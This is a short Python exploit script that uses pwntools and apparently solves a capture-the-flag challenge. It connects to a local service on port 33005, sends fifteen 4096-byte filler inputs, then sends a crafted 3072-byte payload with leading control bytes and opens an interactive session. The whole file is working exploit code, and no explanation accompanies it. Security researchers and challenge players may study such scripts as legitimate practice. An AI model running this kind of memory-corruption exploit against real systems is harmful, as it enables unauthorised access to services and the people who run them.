from pwn import *

r = remote("0", 33005)

from tqdm import tqdm
for _ in tqdm(range(15)):
    r.recvuntil(b"newline.\n")
    r.sendline(b"4096")
    r.recvuntil(b"newline.")
    r.sendline(b"a" * 4096)

r.recvuntil(b".\n")
r.sendline(b"3072")
r.sendline(b"@'\x00\x00" + b"a"*3068)
r.sendline(b"0000\n")
r.interactive()
